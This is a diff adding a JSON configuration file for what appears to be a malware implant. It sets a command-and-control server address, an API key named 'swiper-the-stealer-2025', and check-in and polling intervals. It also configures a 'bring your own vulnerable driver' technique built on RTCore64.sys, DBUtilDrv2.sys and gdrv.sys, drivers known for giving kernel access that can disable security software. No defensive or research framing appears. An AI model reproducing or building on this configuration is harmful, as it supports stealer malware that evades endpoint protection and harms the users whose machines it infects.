@@ -1,0 +1,28 @@
+{
+  "c2": {
+    "server_url": "http://192.168.10.29:8080",
+    "api_key": "swiper-the-stealer-2025",
+    "skip_tls_verify": false,
+    "timeout_seconds": 30,
+    "request_timeout": 30,
+    "heartbeat_interval": 60,
+    "checkin_interval": 10,
+    "retry_attempts": 3,
+    "retry_delay_ms": 5000,
+    "poll_interval_sec": 5
+  },
+  "logging": {
+    "level": "INFO",
+    "output_file": "./byovd-rtcore.log"
+  },
+  "byovd": {
+    "preferred_driver": "RTCore64.sys",
+    "scan_drivers": [
+      "RTCore64.sys",
+      "DBUtilDrv2.sys",
+      "gdrv.sys"
+    ],
+    "test_mode": false,
+    "memory_scan_size": 1048576
+  }
+}
